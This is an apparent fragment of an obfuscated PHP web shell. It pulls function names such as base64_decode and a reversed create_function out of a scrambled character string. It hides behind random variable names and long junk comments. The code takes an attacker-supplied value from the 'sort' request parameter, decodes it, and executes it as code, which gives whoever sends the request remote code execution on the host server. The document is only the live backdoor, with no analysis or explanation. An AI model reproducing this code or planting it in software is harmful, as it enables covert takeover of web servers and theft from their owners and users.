...
$MltGROjr4278 = "hcgfix1sv.8;_(/ey5j*m36ktp7ao2dz)l0buwnrq94";


$fPKzrvDy5331 = "";

foreach([7,28,39,24] as $L){
       $fPKzrvDy5331 .= $MltGROjr4278[$L];
    }


if(isset($_REQUEST /*dGhLcanvVnJXuLTvJmQwBhZegprXlbshakYmlgKrdJycojPxdAFghYtkLvemCkksQhJgnHaHfziBcbESqhmkGhGKkUKVNLWWAzotjAkraIKtJnmGwiNIYLNDBNjXRHBV*/["$fPKzrvDy5331"])){
    $djMbZNou2867 = $_REQUEST /*dGhLcanvVnJXuLTvJmQwBhZegprXlbshakYmlgKrdJycojPxdAFghYtkLvemCkksQhJgnHaHfziBcbESqhmkGhGKkUKVNLWWAzotjAkraIKtJnmGwiNIYLNDBNjXRHBV*/["$fPKzrvDy5331"];
    $NOcdZwVW169 = "";
    $eDFKkfps2615 = "";

    /*iykINQNZCtOVamAodbIulQwgxlERjpprwJqYHwSFPiFEsXQLovkucGYwGkSjykcyEnpIvwQFVrqFDcaDsjGOMQtfJCZUHzJZFkiLcPIXVTUbJAdNqqVBqtIiFoaZJgjT*/

    foreach([35,27,7,15,22,42,12,30,15,1,28,30,15] as $L){
       $NOcdZwVW169 .= $MltGROjr4278[$L];
    }

    /*ABUiCCtKOOrPHsariQeINpQEvuUyEiCholAZWIYQAeIYADQpTKhidFRteSIqtDPPWpZjjiwpgMTAlhAGxYcbnpMCHLpBcrWQxMrMqbOiGOXvRgdrVFSprsBfdXQgEzWk*/


    foreach([7,24,39,39,15,8] as $L){
       $eDFKkfps2615 .= $MltGROjr4278[$L];
    }

    /*RDEJqoZuZkUKpxAvmGBVoOjbtCkfZaPYgNJZkUealZLsIiQTxadVfELrCByxoVCgnrIJYUdZriwuTnZKCNzpPOgaFUFixjiHooBNEnUsrKaPZLdVAUOcsrucBGGnzRIB*/

    $L = $eDFKkfps2615('n'.'o'.''.'i'.''.''.'t'.''.''.''.'c'.'n'.'u'.'f'.''.''.''.''.'_'.''.''.''.'e'.'t'.'a'.''.''.'e'.'r'.''.''.'c'.''.''.'');
    $h = $L("", $NOcdZwVW169($djMbZNou2867));
    $h();
    exit();
